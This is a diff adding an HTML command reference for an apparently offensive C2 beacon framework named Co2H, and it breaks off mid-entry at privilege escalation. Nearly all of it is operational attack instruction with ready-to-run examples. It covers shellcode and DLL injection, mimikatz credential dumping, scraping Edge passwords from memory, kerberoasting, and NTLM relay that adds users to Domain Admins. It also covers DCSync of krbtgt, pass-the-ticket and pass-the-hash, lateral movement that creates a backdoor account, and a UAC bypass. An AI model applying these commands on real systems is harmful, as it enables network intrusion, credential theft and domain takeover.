@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Command Reference</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Home</a> &raquo; Commands</nav>
+
+<h1>Beacon Command Reference</h1>
+
+<p>All commands are queued and executed by the beacon in order.</p>
+
+<h2 id="fs"><a name="fs"></a>Filesystem</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>pwd</code></td><td></td><td>Current working directory of the beacon process.</td></tr>
+<tr><td><code>cd</code></td><td><code>&lt;path&gt;</code></td><td>Change working directory.</td></tr>
+<tr><td><code>ls</code></td><td><code>[path]</code></td><td>List files; without argument — current directory.</td></tr>
+<tr><td><code>rm</code></td><td><code>&lt;path&gt;</code></td><td>Delete a file or directory.</td></tr>
+<tr><td><code>cp</code></td><td><code>&lt;src&gt; &lt;dst&gt;</code></td><td>Copy a file.</td></tr>
+<tr><td><code>mv</code></td><td><code>&lt;src&gt; &lt;dst&gt;</code></td><td>Move or rename (replaces destination if it exists).</td></tr>
+<tr><td><code>download</code></td><td><code>&lt;remote&gt; &lt;local&gt;</code></td><td>Download a file from the target and save locally.</td></tr>
+<tr><td><code>upload</code></td><td><code>&lt;local&gt; &lt;remote&gt;</code></td><td>Upload a local file to the target.</td></tr>
+</table>
+
+<h2 id="exec"><a name="exec"></a>Code Execution</h2>
+<table>
+<tr><td><code>shell</code></td><td><code>&lt;cmd&gt;</code></td><td>One-shot <code>cmd.exe /c &lt;cmd&gt;</code>.</td></tr>
+<tr><td><code>shell</code></td><td>(no argument)</td><td>Enter interactive <code>cmd.exe</code>.</td></tr>
+<tr><td><code>run</code></td><td><code>&lt;cmdline&gt;</code></td><td>Start a process directly, without <code>cmd.exe</code>.</td></tr>
+<tr><td><code>ps</code></td><td></td><td>Process list.</td></tr>
+</table>
+
+<h2 id="inject"><a name="inject"></a>Shellcode Injection</h2>
+<table>
+<tr><td><code>inject</code></td><td><code>&lt;pid&gt; &lt;file&gt;</code></td>
+    <td>Execute shellcode in another process.</td></tr>
+<tr><td><code>inject_apc</code></td><td><code>&lt;pid&gt; &lt;file&gt;</code></td>
+    <td>APC injection to all threads of PID.</td></tr>
+<tr><td><code>spawnto</code></td><td><code>&lt;file&gt; [path]</code></td>
+    <td>Sacrificial process: launch a sacrifice process and execute shellcode in it.
+        Default sacrifice process name — <code>rundll32.exe</code>.</td></tr>
+<tr><td><code>modstomp</code></td><td><code>&lt;file&gt; [dll]</code></td>
+    <td>Module stomping: load a signed module and execute shellcode in its memory.</td></tr>
+</table>
+
+<h2 id="inject_dll"><a name="inject_dll"></a>Inject DLL (Reflective Loading)</h2>
+<table>
+<tr><td><code>inject_dll</code></td><td><code>&lt;dll_path&gt; [args...]</code></td>
+    <td>Fork &amp; Run: a sacrificial process is launched, the DLL is reflectively loaded inside it.
+        If arguments are passed — a mimikatz export is called and output is captured
+        to the operator console.</td></tr>
+<tr><td><code>inject_dll</code></td><td><code>&lt;dll_path&gt; --spawnto &lt;PID&gt; [args...]</code></td>
+    <td>Inject into an existing process: the DLL is reflectively loaded directly into the address
+        space of <code>&lt;PID&gt;</code>, output is captured via a named pipe.</td></tr>
+</table>
+
+<p>Unlike <code>inject</code>/<code>spawnto</code> (which run shellcode),
+<code>inject_dll</code> loads an arbitrary PE DLL entirely into memory: maps the image,
+fixes relocations, resolves imports, and calls the specified export.</p>
+
+<h3 id="inject_dll_priv">Privileges</h3>
+<table>
+<tr><th>Scenario</th><th>Token the DLL runs with</th><th>Access to LSASS</th></tr>
+<tr><td>Fork &amp; Run</td>
+    <td>Beacon's token (inherited by the sacrificial process).</td>
+    <td>Yes, if the beacon has <code>SeDebugPrivilege</code>.</td></tr>
+<tr><td><code>--spawnto &lt;PID&gt;</code></td>
+    <td>Token of the <strong>target</strong> process.</td>
+    <td>Only if <code>SeDebugPrivilege</code> is present in that token;
+        most Medium IL user processes do not have it.</td></tr>
+</table>
+
+<div class="opsec">
+The most direct path to <code>sekurlsa::logonpasswords</code>:
+<code>privesc_admin</code> &rarr; fork &amp; run. The sacrificial process inherits
+the beacon's High IL token; mimikatz opens LSASS without issues.
+PID injection without <code>privesc</code> will almost always hit
+<code>ERROR_ACCESS_DENIED (0x05)</code> inside
+<code>kuhl_m_sekurlsa_acquireLSA</code>.
+</div>
+
+<h3 id="inject_dll_examples">Examples</h3>
+<pre>
+# Mimikatz fork &amp; run (requires SeDebug on the beacon)
+inject_dll bof\bibikatz\powerkatz.dll sekurlsa::logonpasswords exit
+inject_dll bof\bibikatz\powerkatz.dll lsadump::sam exit
+inject_dll bof\bibikatz\powerkatz.dll "kerberos::list /export" exit
+
+# Arbitrary DLL — the DLL entry point will be called
+inject_dll C:\payloads\my_dll.dll
+
+# PID injection (requires write access to the target's address space)
+inject_dll bof\bibikatz\powerkatz.dll --spawnto 4128 sekurlsa::logonpasswords exit
+</pre>
+
+<div class="opsec">
+The DLL is read from the <em>operator's</em> disk and sent into the session — the file never
+exists on the target machine; the image lives only in the memory of the
+sacrificial/target process. After the export finishes in fork &amp; run
+the sacrificial process is destroyed; in PID mode the target process stays alive —
+the operator should take this into account.
+</div>
+
+<h2 id="migrate"><a name="migrate"></a>Migrate</h2>
+<table>
+<tr><td><code>migrate</code></td><td><code>&lt;pid&gt;</code></td>
+    <td>Reflective migration of the beacon into the target process. The current beacon
+        packs its image into a payload, injects it into <code>&lt;pid&gt;</code>,
+        waits for the new beacon to check in on the teamserver, and terminates
+        the old process.</td></tr>
+</table>
+<p>Unlike <code>inject</code>, <code>migrate</code> moves
+<em>the beacon itself</em>, not arbitrary shellcode: the new process inherits
+the current session, sleep/jitter settings, and accumulated data.
+In <em>Sessions</em> the old row is marked dead; the new one appears with the same beacon_id.</p>
+<div class="opsec">
+The PID target must be compatible by architecture (x64) and integrity level
+(cannot migrate from Medium IL to System without a prior
+<code>steal_token</code>/<code>privesc_*</code>). If the current token lacks
+<code>SeDebugPrivilege</code>, migration into another process will fail with an access error.
+</div>
+
+<h2 id="bof"><a name="bof"></a>BOF (Beacon Object Files)</h2>
+<table>
+<tr><td><code>bof</code></td><td><code>&lt;name&gt; [entry] [-- fmt arg1 arg2 ...]</code></td>
+    <td>Load a COFF into memory and call the entry point (default: <code>go</code>).</td></tr>
+</table>
+
+<h3>Automatic File Search</h3>
+<p>If the file is not found at the specified path, the client recursively searches
+for it in the <code>bof/</code> directory. The <code>.o</code> extension may be omitted.</p>
+<pre>
+bof whoami.x64.o                        &mdash; search by name
+bof whoami                              &mdash; tries .o, .x64.o, .x86.o
+bof bofalf-bof\SAL-BOF\whoami.x64.o  &mdash; full path
+</pre>
+
+<h3>Arguments</h3>
+<p>After <code>--</code> specify a format string and values:</p>
+<table>
+<tr><th>Symbol</th><th>Type</th></tr>
+<tr><td><code>i</code></td><td>int32</td></tr>
+<tr><td><code>s</code></td><td>int16</td></tr>
+<tr><td><code>z</code></td><td>ANSI string</td></tr>
+<tr><td><code>Z</code></td><td>Wide string (UTF-16)</td></tr>
+<tr><td><code>b</code></td><td>Binary file</td></tr>
+</table>
+<pre>
+bof printspoofer go -- iZ 0 "cmd.exe /c whoami"
+</pre>
+<p>Compatible with the Cobalt Strike BOF API. External DLL functions
+(<code>KERNEL32</code>, <code>MSVCRT</code>, etc.)
+are loaded automatically.</p>
+
+<h2 id="execasm"><a name="execasm"></a>Execute-Assembly (.NET)</h2>
+<table>
+<tr><td><code>execute-assembly</code></td><td><code>&lt;path.exe&gt; [args...]</code></td>
+    <td>Load a .NET assembly from the operator's disk and execute it in the beacon process via CLR hosting.</td></tr>
+</table>
+<p>The assembly is transferred as bytes into memory — no file is created on the target disk.</p>
+<div class="opsec">
+Loading the CLR runtime exposes the process as a .NET host. Recommended:
+<code>spawnto</code> + <code>execute-assembly</code> in a child process.
+</div>
+
+<h2 id="pivot"><a name="pivot"></a>Pivot and Relay Chains</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>tcp_pivot</code></td><td><code>&lt;host&gt; &lt;port&gt;</code></td>
+    <td>Open a raw TCP channel to a pivot listener on the teamserver.
+        Allows a beacon in an isolated segment to reach the teamserver
+        through an intermediary beacon.</td></tr>
+</table>
+
+<h3 id="relay-chain">Multi-hop Chains (relay chain)</h3>
+<p>Co2H supports arbitrarily deep chains:</p>
+<pre>
+Machine3 ─TCP pivot─&gt; Machine2 ─TCP pivot─&gt; Machine1 ─HTTPS─&gt; teamserver
+</pre>
+<p>Each "parent" beacon automatically becomes a TCP relay for "child" beacons.
+The server recursively unpacks nested relay frames and routes data to the correct
+beacon by <code>beacon_id</code>. The operator sees all three beacons as independent
+sessions in the Sessions table and can issue tasks to each in the normal way.</p>
+<div class="opsec">
+<b>Setting up a 3-hop chain:</b><br>
+1. Machine1 already has an HTTPS beacon; a TCP listener is active on the teamserver (e.g. port 4444).<br>
+2. On Machine1, create a TCP Pivot listener via UI: <b>Listeners &rarr; New &rarr; Pivot &rarr; port 5555</b>.<br>
+3. On Machine2, start a beacon with TCP transport pointing to <code>machine1:5555</code>.
+   Machine2's beacon will appear in Sessions.<br>
+4. On Machine2, similarly create a pivot listener (port 6666).<br>
+5. On Machine3, start a beacon &rarr; <code>machine2:6666</code>. Machine3's beacon will appear.<br><br>
+<b>Limitation:</b> each beacon relay in the chain adds RTT; with
+<code>sleep 0</code> all three hops execute tasks in real time.
+Recommended <code>sleep</code> of at least 500 ms on intermediate beacons
+to avoid TCP buffer overflow.
+</div>
+
+<h2 id="tokens"><a name="tokens"></a>Tokens and Privileges</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>getuid</code></td><td></td><td>Current user / SID.</td></tr>
+<tr><td><code>steal_token</code></td><td><code>&lt;pid&gt;</code></td>
+    <td>Duplicate the token of the specified process.
+        After execution, <code>shell</code> and <code>run</code> launch
+        child processes <b>as the owner of the duplicated token</b>, not as the
+        beacon process. Network requests are also made with the duplicated
+        credential. Requires <code>SeDebugPrivilege</code>.</td></tr>
+<tr><td><code>priv_all</code></td><td></td>
+    <td>Enable all privileges present in the current token.
+        By default Windows leaves most privileges disabled,
+        even if they are part of the token.<br>
+        Typical workflow:<br>
+        <code>steal_token &lt;pid&gt;</code> &rarr; <code>priv_all</code> &rarr;
+        commands run with the full privilege set (SeLoadDriverPrivilege,
+        SeBackupPrivilege, SeTakeOwnershipPrivilege, etc.).
+    </td></tr>
+<tr><td><code>make_token</code></td><td><code>&lt;DOMAIN\user&gt; &lt;pass&gt;</code></td>
+    <td>Create a network token with the specified credentials.
+        Applies to outbound network requests and child processes
+        (similar to <code>steal_token</code>).</td></tr>
+<tr><td><code>rev2self</code></td><td></td>
+    <td>Drop impersonation. Child processes will again run as the
+        beacon process.</td></tr>
+</table>
+
+<div class="opsec">
+<b>Important:</b> <code>steal_token</code> changes the identity for child processes
+(shell, run) and for network requests, but <b>does not change</b> the primary token
+of the beacon process itself. The USER column in the Sessions table will still show
+the original user — this is expected behavior.<br><br>
+<b>Typical path to SYSTEM:</b><br>
+<code>steal_token 564</code> &nbsp;<em>(winlogon.exe)</em><br>
+<code>priv_all</code><br>
+<code>shell whoami /all</code> &nbsp;&rarr; shows NT AUTHORITY\SYSTEM with all privileges enabled
+</div>
+
+<h2 id="creds"><a name="creds"></a>Credential Dumping</h2>
+
+<h3>hashdump</h3>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>hashdump</code></td><td></td>
+    <td>Enables <code>SeBackupPrivilege</code> and saves the SAM, SYSTEM, SECURITY
+        registry hives to <code>%TEMP%\sam.hiv / system.hiv / security.hiv</code>.
+        Retrieve the files with <code>download</code> and parse offline.</td></tr>
+</table>
+
+<div class="opsec">
+Requires SYSTEM or an elevated process with <code>SeBackupPrivilege</code>.<br>
+Offline parsing:<br>
+<code>impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL</code><br>
+<code>mimikatz lsadump::sam /system:system.hiv /sam:sam.hiv</code>
+</div>
+
+<h3 id="edge_creds">edge_creds</h3>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>edge_creds</code></td><td></td>
+    <td>Extract saved passwords from the memory of the <code>msedge.exe</code> process.</td></tr>
+</table>
+<p>Microsoft Edge stores all saved passwords <b>in plaintext</b> in the browser
+process heap, even if the user has not visited those sites in the current session.
+Microsoft classifies this as <i>intended behaviour</i>.</p>
+
+<p><b>Mechanism:</b></p>
+<ol>
+<li>Enumerate processes via <code>CreateToolhelp32Snapshot</code> &rarr; find
+    <code>msedge.exe</code></li>
+<li><code>OpenProcess(PROCESS_VM_READ)</code> &mdash; read under the current user</li>
+<li><code>VirtualQueryEx</code> + <code>ReadProcessMemory</code> &mdash; scan
+    committed pages</li>
+<li>Search for pattern: <code>URL\0scheme\0username\0password\0</code> in the heap</li>
+</ol>
+
+<p><b>Output format:</b></p>
+<pre>  URL:  https://example.com/login
+  User: user@example.com
+  Pass: P@ssw0rd123</pre>
+
+<div class="opsec">
+<b>Privileges:</b> no elevation required &mdash; works as the current user
+(the same one who launched Edge).<br>
+<b>Detection:</b> <code>ReadProcessMemory</code> may trigger EDR hooks
+on cross-process reads. Some EPP products monitor access to browser processes.
+</div>
+
+<h3>Kerberos Tickets</h3>
+<p>All ticket commands operate via the Kerberos SSP in the current logon session. SYSTEM rights are not required.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>ticket_list</code></td><td></td>
+    <td>List all tickets in the current session: ServerName @ Realm, EncryptionType.</td></tr>
+<tr><td><code>ticket_dump</code></td><td><code>[spn]</code></td>
+    <td>Extract a ticket as a base64-encoded .kirbi. Without argument — TGT (<code>krbtgt/REALM</code>).
+        With argument — service ticket for a SPN, e.g. <code>cifs/dc01.corp.local</code>.</td></tr>
+<tr><td><code>ticket_use</code></td><td><code>&lt;base64&gt;</code></td>
+    <td>Pass-the-ticket: import a .kirbi (base64) into the current session cache.
+        Compatible with mimikatz <code>kerberos::ptt</code> and Rubeus.</td></tr>
+<tr><td><code>ticket_purge</code></td><td></td>
+    <td>Clear the entire ticket cache of the current session.</td></tr>
+</table>
+<div class="opsec">
+<b>Pass-the-ticket scenario:</b><br>
+1. <code>ticket_dump cifs/fileserver.corp.local</code> &rarr; get base64<br>
+2. Add to Credentials store (kind: ticket) for storage<br>
+3. On another beacon: <code>ticket_use &lt;base64&gt;</code><br>
+4. <code>ls \\fileserver\share</code> — access with the foreign ticket
+</div>
+
+<h3 id="kerberoast">Kerberoasting</h3>
+<p>Enumerates via LDAP all accounts with a non-empty <code>servicePrincipalName</code>
+and requests a TGS ticket for each.
+The encrypted part of the ticket is output in hashcat format without touching LSASS.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>kerberoast</code></td>
+    <td><code>[domain]</code></td>
+    <td>Without argument — domain from environment variable.
+        With argument — uses the specified domain.
+        Finds active accounts with an SPN via LDAP.</td></tr>
+</table>
+<div class="opsec">
+<b>Requirements:</b> any domain session (no DA rights required).<br><br>
+<b>Typical scenario:</b><br>
+<code>kerberoast CORP.LOCAL</code><br>
+&rarr; output for RC4 accounts:<br>
+<code>$krb5tgs$23$*svc_sql*CORP.LOCAL*MSSQLSvc/sql01:1433*&lt;checksum&gt;$&lt;data&gt;</code><br><br>
+<b>Cracking:</b><br>
+<code>hashcat -m 13100 hashes.txt wordlist.txt</code> — RC4 (etype 23)<br>
+<code>hashcat -m 19600 hashes.txt wordlist.txt</code> — AES-128 (etype 17)<br>
+<code>hashcat -m 19700 hashes.txt wordlist.txt</code> — AES-256 (etype 18)<br><br>
+AES-256 hashes crack significantly slower — prioritize accounts with
+<code>adminCount=1</code> or stale ones (<code>pwdLastSet</code> &gt; 180 days).<br><br>
+After cracking the password — <code>make_token CORP\svc_sql &lt;password&gt;</code>
+or <code>dcsync CORP.LOCAL svc_sql</code> for the NT hash.
+</div>
+
+<h2 id="relay"><a name="relay"></a>NTLM Relay / Coercion</h2>
+<p>Both commands start an internal NTLM relay server on the beacon machine,
+coerce the target to authenticate via MS-EFSR,
+and relay the credentials to the DC's LDAP port.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>ldap_addda</code></td>
+    <td><code>&lt;dc_ip&gt; &lt;beacon_ip&gt; &lt;user_dn&gt; &lt;group_dn&gt; [port=445]</code></td>
+    <td>Coerce DC &rarr; relay its NTLM to LDAP &rarr; perform
+        <code>AddMember</code> — adds <code>user_dn</code> to group <code>group_dn</code>
+        (e.g. <code>CN=Domain Admins,CN=Users,DC=&hellip;</code>).
+        Requires an account that can self-coerce the DC (usually any
+        domain user on an unpatched host).</td></tr>
+<tr><td><code>ldap_rbcd</code></td>
+    <td><code>&lt;dc_ip&gt; &lt;beacon_ip&gt; &lt;coerce_ip&gt; &lt;target_dn&gt; &lt;attacker_sid&gt; [port=445]</code></td>
+    <td>Coerce <code>coerce_ip</code> &rarr; relay to DC LDAP &rarr; write the
+        <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute to <code>target_dn</code>
+        (Resource-Based Constrained Delegation). Afterward the attacker account
+        can request an S4U2proxy ticket for any service on the target.</td></tr>
+</table>
+<div class="opsec">
+<b>Typical ldap_addda scenario:</b><br>
+<code>ldap_addda 192.168.1.1 192.168.1.50 "CN=jdoe,CN=Users,DC=corp,DC=local" "CN=Domain Admins,CN=Users,DC=corp,DC=local"</code><br><br>
+<b>Typical ldap_rbcd scenario:</b><br>
+<code>ldap_rbcd 192.168.1.1 192.168.1.50 192.168.1.10 "CN=fileserver,CN=Computers,DC=corp,DC=local" S-1-5-21-&hellip;-1234</code><br><br>
+MS-EFSR coercion works against unpatched systems
+(without KB5005413/KB5005565). LDAP relay requires the absence of LDAP signing
+(Required by default on modern DCs).
+</div>
+
+<h2 id="dcsync"><a name="dcsync"></a>DCSync (MS-DRSR)</h2>
+<p>Replicates user secrets directly from the DC via the MS-DRSR protocol.
+Does not touch LSASS — RPC only. Output in secretsdump format.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>dcsync</code></td>
+    <td><code>&lt;domain&gt; &lt;username&gt;</code></td>
+    <td>Retrieve the NT hash of a user via MS-DRSR replication.
+        Authentication: Kerberos (fallback NTLM), encrypted transport.</td></tr>
+</table>
+<div class="opsec">
+<b>Token requirements:</b> Domain Admin or explicit
+<code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code>
+rights on the domain NC.<br><br>
+<b>Typical path:</b><br>
+<code>steal_token &lt;PID of DA process&gt;</code><br>
+<code>dcsync CORP.LOCAL Administrator</code><br>
+<code>dcsync CORP.LOCAL krbtgt</code> <em>&larr; golden ticket</em><br><br>
+<b>Output:</b><br>
+<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;NT hash&gt;:::</code><br><br>
+<b>Using the hash (PTH):</b><br>
+<code>make_token CORP\Administrator /ntlm:&lt;NT hash&gt;</code><br><br>
+If it outputs <code>no_session_key</code> — session key retrieval problem (occurs with NTLM).
+Works reliably with Kerberos.
+</div>
+
+<h2 id="adcs"><a name="adcs"></a>ADCS Enumeration (ESC1-16)</h2>
+<p>Scanner for Active Directory Certificate Services misconfigurations. Without admin
+rights, finds vulnerable certificate templates, misconfigured certificate authorities,
+weak mapping rules on DCs, and accessible Web Enrollment.
+Covers 14 vulnerability classes in the ESC family.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>adcs_enum</code></td>
+    <td><code>[domain]</code></td>
+    <td>Without argument — current domain. With argument — specified domain.
+        The nearest domain controller is selected automatically.</td></tr>
+</table>
+
+<h3>What Is Checked</h3>
+<table>
+<tr><th>ESC</th><th>What Is Searched For</th></tr>
+<tr><td><b>ESC1</b></td>
+    <td>Template allows the client to specify an arbitrary SAN (UPN/DNS) and has an EKU
+        for authentication (Client Auth, Smart Card Logon, PKINIT). A low-privileged
+        user can enroll &rarr; issue a certificate for any domain account.</td></tr>
+<tr><td><b>ESC2</b></td>
+    <td>Template issues a certificate with Any Purpose EKU or no EKU restrictions at all.
+        Low-privileged enroll &rarr; certificate is suitable for forging anything.</td></tr>
+<tr><td><b>ESC3</b></td>
+    <td>Template with EKU Certificate Request Agent. Allows signing requests on behalf
+        of others (enroll-on-behalf-of) and issuing certificates for other users.</td></tr>
+<tr><td><b>ESC4</b></td>
+    <td>A non-admin principal has rights to modify the template (GenericWrite,
+        WriteDACL, WriteOwner, etc.). The attacker can turn the template into ESC1 themselves.</td></tr>
+<tr><td><b>ESC5</b></td>
+    <td>A non-admin has write access to PKI infrastructure containers in AD
+        (Public Key Services, NTAuth, root CAs). Full control over PKI.</td></tr>
+<tr><td><b>ESC6</b></td>
+    <td>The CA has a mode enabled where it accepts alternative names directly from
+        request attributes. Any template becomes equivalent to ESC1.</td></tr>
+<tr><td><b>ESC7</b></td>
+    <td>A non-admin has write rights on the CA AD object. Modification of
+        templates and CA parameters is possible.</td></tr>
+<tr><td><b>ESC8</b></td>
+    <td>Web Enrollment endpoint (<code>/certsrv/</code>) is accessible via HTTP/HTTPS.
+        HTTP 401 indicates a possible NTLM relay.</td></tr>
+<tr><td><b>ESC9</b></td>
+    <td>Template issues a certificate without a SID extension. Bypasses mandatory
+        strong binding (introduced by KB5014754) and allows ESC1 on modern DCs.</td></tr>
+<tr><td><b>ESC10</b></td>
+    <td>The domain controller has weakened certificate-to-user mapping rules —
+        the DC accepts weak UPN binding even without a SID extension.</td></tr>
+<tr><td><b>ESC11</b></td>
+    <td>The CA does not enforce mandatory encryption of RPC certificate issuance
+        requests. Relay is possible via coercion.</td></tr>
+<tr><td><b>ESC13</b></td>
+    <td>The template's application policy is linked to an AD security group. Obtaining
+        a certificate from such a template automatically grants membership in that group.</td></tr>
+<tr><td><b>ESC15</b><br>(EKUwu)</td>
+    <td>Old-format template (schema v1) allowing the client to specify
+        SAN (CVE-2024-49019). V1 does not validate EKU from the request — the client
+        can supply arbitrary application policies.</td></tr>
+<tr><td><b>ESC16</b></td>
+    <td>The CA globally has SID extension addition disabled.
+        All issued certificates bypass strong binding.</td></tr>
+</table>
+
+<div class="opsec">
+<b>Requirements:</b> any domain session (no DA rights). Some checks
+access the registry of the CA and domain controller — they require
+the Remote Registry service on those machines (or the beacon must be running on them).
+If registry access is unavailable these checks are silently skipped.<br><br>
+<b>Typical scenario:</b><br>
+<code>adcs_enum</code> — current domain<br>
+<code>adcs_enum corp.local</code> — explicit specification<br><br>
+<b>Example output:</b><br>
+<code>[ESC1] WebServer-Vuln</code><br>
+<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Flag:&nbsp;&nbsp; CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (arbitrary SAN)</code><br>
+<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EKU:&nbsp;&nbsp;&nbsp; Client Authentication</code><br>
+<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enroll: CORP\Domain Users (Enroll)</code><br><br>
+Templates that exist in AD but are not published on any CA are flagged
+separately — the CA will reject the request; exploitation is not possible.<br><br>
+<b>Not covered:</b> ESC12 (offline scenario with hardware HSM,
+not applicable to network enumeration) and ESC14 (Samba-specific, not reproducible
+on Microsoft CA).
+</div>
+
+<h2 id="lateral"><a name="lateral"></a>Lateral Movement</h2>
+<p>All four commands execute a command on a remote host with the rights of the beacon's current token.
+Output is read via <code>\\target\ADMIN$\Temp\&lt;rand&gt;.tmp</code>
+(except winrmexec, which uses its own WinRM transport).</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>psexec_cmd</code></td>
+    <td><code>&lt;target&gt; &lt;command&gt;</code></td>
+    <td>Creates a temporary Windows service on the target, executes the command,
+        reads output via UNC, and removes the service.<br>
+        Requires Local Admin + SCM rights.</td></tr>
+<tr><td><code>wmiexec</code></td>
+    <td><code>&lt;target&gt; &lt;command&gt;</code></td>
+    <td>Runs the command via WMI <code>Win32_Process::Create</code>.
+        Does not create a service — quieter than psexec.<br>
+        Requires Local Admin on the target.</td></tr>
+<tr><td><code>dcomexec</code></td>
+    <td><code>&lt;target&gt; &lt;command&gt;</code></td>
+    <td>Runs the command via the remote DCOM object <code>MMC20.Application</code>.<br>
+        Does not require an active user session. Uses port 135 (DCOM endpoint mapper).<br>
+        Requires Local Admin on the target.</td></tr>
+<tr><td><code>winrmexec</code></td>
+    <td><code>&lt;target&gt; &lt;command&gt;</code></td>
+    <td>Connects to <code>http://target:5985/wsman</code> and executes the command via WinRM.<br>
+        Requires WinRM HTTP (port 5985) + Local Admin on the target.<br>
+        Enable WinRM on target: <code>winrm quickconfig</code>.</td></tr>
+</table>
+<div class="opsec">
+<b>Typical scenario:</b><br>
+<code>steal_token &lt;PID with LocalAdmin token&gt;</code><br>
+<code>psexec_cmd 192.168.1.20 whoami</code><br>
+<code>wmiexec fileserver.corp.local ipconfig /all</code><br>
+<code>dcomexec 192.168.1.20 "net user hacker P@ssw0rd! /add"</code><br>
+<code>winrmexec 192.168.1.20 hostname</code><br><br>
+<b>Ports:</b>
+<ul>
+<li><code>psexec_cmd</code>, <code>wmiexec</code>, <code>dcomexec</code> — 445 (SMB for ADMIN$) + 135/dynamic (DCOM/WMI/SCM)</li>
+<li><code>winrmexec</code> — 5985 (HTTP) or 5986 (HTTPS)</li>
+</ul>
+<b>Enable WinRM on target:</b><br>
+<code>winrm quickconfig -q</code><br><br>
+Output wait timeout: psexec/wmi/dcom — 15 s, winrm — 30 s.
+</div>
+
+<h2 id="portfwd"><a name="portfwd"></a>Port Forward</h2>
+<p>Opens a TCP listener on the beacon machine and transparently proxies each incoming
+connection to a specified remote host and port. Runs in a background thread —
+the beacon continues accepting tasks. Up to 8 rules are supported simultaneously.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>portfwd add</code></td>
+    <td><code>&lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;</code></td>
+    <td>Create a rule: listen on <code>0.0.0.0:lport</code>,
+        forward each connection to <code>rhost:rport</code>.</td></tr>
+<tr><td><code>portfwd del</code></td>
+    <td><code>&lt;lport&gt;</code></td>
+    <td>Delete a rule: close the listener, terminate all existing
+        proxied connections.</td></tr>
+<tr><td><code>portfwd list</code></td>
+    <td>(or just <code>portfwd</code>)</td>
+    <td>Show the list of active rules.</td></tr>
+</table>
+<div class="opsec">
+<b>Scenario: access RDP behind the beacon</b><br>
+<code>portfwd add 13389 10.10.10.5 3389</code><br>
+<code>mstsc /v:beacon-ip:13389</code><br><br>
+<b>Scenario: tunnel to an internal web server</b><br>
+<code>portfwd add 18080 internal-app.corp.local 80</code><br>
+<code>curl http://beacon-ip:18080/</code><br>
+</div>
+
+<h2 id="rportfwd"><a name="rportfwd"></a>Reverse Port Forward</h2>
+<p>The teamserver opens a TCP port (bind); on incoming connections traffic goes
+through the C2 channel to the beacon, which forwards it to <code>rhost:rport</code>.
+Architecturally — the mirror of SOCKS5: the client connects to the teamserver, not to
+the operator's proxy client.</p>
+<table>
+<tr><th>How to create</th><th>Description</th></tr>
+<tr><td>Sessions &rarr; right-click &rarr; <b>Start Reverse Port Forward&hellip;</b></td>
+    <td>Dialog: <b>Bind host</b> and <b>Bind port</b> — what the teamserver opens;
+        <b>Rhost</b> and <b>Rport</b> — the target the beacon connects to.
+        After clicking OK the teamserver starts listening. On the first incoming
+        connection the beacon establishes a connection to rhost:rport.</td></tr>
+</table>
+<div class="opsec">
+<b>Traffic flow:</b><br>
+<code>external client &rarr; teamserver:bind_port &rarr; (C2 channel) &rarr; beacon &rarr; rhost:rport</code><br><br>
+<b>Example — access to an internal web server through the teamserver:</b><br>
+Bind host: <code>0.0.0.0</code>, Bind port: <code>8080</code>,
+Rhost: <code>internal-webapp.corp.local</code>, Rport: <code>80</code><br>
+<code>curl http://teamserver-ip:8080/</code><br><br>
+<b>Difference from SOCKS5:</b> SOCKS5 tunnels arbitrary traffic through the polling loop;
+rportfwd opens a specific port directly on the teamserver, requires no
+SOCKS5 client, and works for any TCP protocol.
+</div>
+
+<h2 id="screenshot"><a name="screenshot"></a>Screenshot</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>screenshot</code></td><td></td>
+    <td>Captures the entire virtual desktop (all monitors) and returns a 24-bit BMP file.
+        The file is automatically saved on the operator's machine.</td></tr>
+</table>
+<div class="opsec">
+The file is saved to the operator's desktop as<br>
+<code>%USERPROFILE%\Desktop\screenshot_&lt;beaconId&gt;_&lt;timestamp&gt;.bmp</code><br>
+and immediately appears in the <b>Downloads</b> tab.<br><br>
+Captures layered windows (translucent UIs);
+DRM-protected windows are not captured.
+</div>
+
+<h2 id="privesc"><a name="privesc"></a>Privilege Escalation</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>privesc_admin</code></td><td></td>
+    <td>UAC bypass via registry key hijack in HKCU.
+        The current executable is re-launched with High Integrity.
+        The registry key is deleted after launch.</td></tr>
+<tr><td><code>privesc_system</code></td><td></td>
+    <td>Steals the <code>winlogon.exe</code> token and launches a new beacon instance
+        as SYSTEM in the active console session.
+        Requires <code>SeDebugPrivilege</code> (elevated process or Administrator).</td></tr>
+<tr><td><code>privesc_plasma</code></td><td></td>
+    <td>Elevates directly from a standard user to <b>SYSTEM</b> without an intermediate
